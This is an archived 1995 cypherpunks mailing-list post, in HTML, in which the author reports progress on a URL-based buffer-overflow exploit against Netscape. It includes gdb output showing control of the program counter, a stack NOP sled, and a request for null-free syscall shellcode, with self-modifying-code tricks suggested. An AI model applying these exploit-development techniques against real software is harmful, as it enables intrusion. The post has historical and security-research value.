@@ -1,0 +1,152 @@
+<!-- MHonArc v2.4.3 -->
+<!--X-Subject: Status of Netscape Bug Exploit (suggestions needed) -->
+<!--X-From-R13: Dnl Qebzjryy <ewpNpynex.arg> -->
+<!--X-Date: Tue, 26 Sep 95 20:38:18 PDT -->
+<!--X-Message-Id: 199509270338.XAA09600@clark.net -->
+<!--X-Content-Type: text/plain -->
+<!--X-Head-End-->
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML//EN">
+<HTML>
+<HEAD>
+<TITLE>Status of Netscape Bug Exploit (suggestions needed)</TITLE>
+<LINK REV="made" HREF="mailto:rjc@clark.net">
+</HEAD>
+<BODY>
+<!--X-Body-Begin-->
+<!--X-User-Header-->
+<!--X-User-Header-End-->
+<!--X-TopPNI-->
+<HR>
+[<A HREF="msg01990.html">Date Prev</A>][<A HREF="msg01998.html">Date Next</A>][<A HREF="msg01995.html">Thread Prev</A>][<A HREF="msg02066.html">Thread Next</A>][<A HREF="index.html#02005">Date Index</A>][<A HREF="threads.html#02005">Thread Index</A>]
+<!--X-TopPNI-End-->
+<!--X-MsgBody-->
+<!--X-Subject-Header-Begin-->
+<H1>Status of Netscape Bug Exploit (suggestions needed)</H1>
+<HR>
+<!--X-Subject-Header-End-->
+<!--X-Head-of-Message-->
+<UL>
+<LI><em>To</em>: <A HREF="mailto:cypherpunks@toad.com">cypherpunks@toad.com</A></LI>
+<LI><em>Subject</em>: Status of Netscape Bug Exploit (suggestions needed)</LI>
+<LI><em>From</em>: Ray Cromwell &lt;<A HREF="mailto:rjc@clark.net">rjc@clark.net</A>&gt;</LI>
+<LI><em>Date</em>: Tue, 26 Sep 1995 23:38:05 -0400 (EDT)</LI>
+<LI><em>Cc</em>: <A HREF="mailto:rjc@clark.net">rjc@clark.net</A> (Ray Cromwell)</LI>
+<LI><em>Sender</em>: <A HREF="mailto:owner%2Dcypherpunks@toad.com">owner-cypherpunks@toad.com</A></LI>
+</UL>
+<!--X-Head-of-Message-End-->
+<!--X-Head-Body-Sep-Begin-->
+<HR>
+<!--X-Head-Body-Sep-End-->
+<!--X-Body-of-Message-->
+<PRE>
+
+Ok Folks, here's what I got so far...
+
+
+1) a URL that can place a specific value in the program counter
+
+(gdb) select-frame 2
+(gdb) info frame
+Stack level 2, frame at 0xefbfbc30:
+ eip = 0xefbfbc30; saved eip 0x90909090
+ ^^^^^^^^^^^^^^^^
+ called by frame at 0x90909090, caller of frame at 0xefbfbc14
+ Arglist at 0xefbfbc30, args: 
+ Locals at 0xefbfbc30, Previous frame's sp is 0xefbfbc1c
+ Saved registers:
+  eax at 0xefbfbc2c, ecx at 0xefbfbc28, edx at 0xefbfbc24, ebx at 0xefbfbc20,
+  ebp at 0xefbfbc18, esi at 0xefbfbc14, edi at 0xefbfbc10, eip at 0xefbfbc0c,
+  ps at 0xefbfbc08
+ 
+2) A piece of exploit code on the stack near the PC
+
+(gdb) disassemble 0xefbfbc10 0xefbfbc40
+0xefbfbc27:     nop    
+0xefbfbc28:     nop    
+0xefbfbc29:     nop    
+0xefbfbc2a:     nop
+0xefbfbc2b:     nop    
+0xefbfbc2c:     nop    
+0xefbfbc2d:     nop    
+0xefbfbc2e:     nop    
+0xefbfbc2f:     nop    
+0xefbfbc30:     nop    
+0xefbfbc31:     nop    
+0xefbfbc32:     nop    
+0xefbfbc33:     nop    
+0xefbfbc34:     nop    
+0xefbfbc35:     nop    
+0xefbfbc36:     nop    
+0xefbfbc37:     nop    
+0xefbfbc38:     nop    
+0xefbfbc39:     nop    
+0xefbfbc3a:     nop    
+0xefbfbc3b:     nop    
+0xefbfbc3c:     nop    
+0xefbfbc3d:     nop    
+0xefbfbc3e:     nop    
+0xefbfbc3f:     nop    
+0xefbfbc40:     nop    
+ 
+3) exploit code that calls the kernel syscall() with SYS_exit
+  (benign exploit, causes your browser to exit)
+
+The problem? To make a syscall under BSDI2.0, I have to execute
+an lcall 0x7,0x0 with 1,0 on the stack. However, to exploit the netscape
+bug, you can not embed 0x0 in the URL. No problem I thought, I searched
+Netscape's executable for any kernel calls, and found an lcall 0x7,0x0
+at 0x257fee. But I can't do a 32-bit direct jump without a zero,
+in the instruction (the 32-bit address is 0x00257fee), and I can't
+do a relative jump from 0xefbfbc30+ 
+
+If you can come up with some 386 assembly under BSDI2.0 which can
+invoke syscall() in the kernel without any embeded 0x0 bytes
+in the code, you can share a Hack Netscape T-Shirt with me.
+
+If it turns out to be too hard under BSDI, I'll gladly assist
+in producing exploits for Windows or another operating system.
+
+One trick I thought up for embeding zeros in the code is to self-modify
+the code using XOR ADDRESS,ADDRESS where ADDRESS is a byte on the stack
+within the code.
+
+Anyone have any better ones?
+
+-Ray
+
+</PRE>
+
+<!--X-Body-of-Message-End-->
+<!--X-MsgBody-End-->
+<!--X-Follow-Ups-->
+<HR>
+<!--X-Follow-Ups-End-->
+<!--X-References-->
+<!--X-References-End-->
+<!--X-BotPNI-->
+<UL>
+<LI>Prev by Date:
+<STRONG><A HREF="msg01990.html">Re: cypherpunks press releases/contact list: YES!! DO IT!!</A></STRONG>
+</LI>
+<LI>Next by Date:
+<STRONG><A HREF="msg01998.html">Time Keys, Some Secure Ideas (by Alias: Jay Hyden)</A></STRONG>
+</LI>
+<LI>Prev by thread:
+<STRONG><A HREF="msg01995.html">CHA_cha</A></STRONG>
+</LI>
+<LI>Next by thread:
+<STRONG><A HREF="msg02066.html">Re: Status of Netscape Bug Exploit (suggestions needed)</A></STRONG>
+</LI>
+<LI>Index(es):
+<UL>
+<LI><A HREF="index.html#02005"><STRONG>Date</STRONG></A></LI>
+<LI><A HREF="threads.html#02005"><STRONG>Thread</STRONG></A></LI>
+</UL>
+</LI>
+</UL>
+
+<!--X-BotPNI-End-->
+<!--X-User-Footer-->
+<!--X-User-Footer-End-->
+</BODY>
+</HTML>
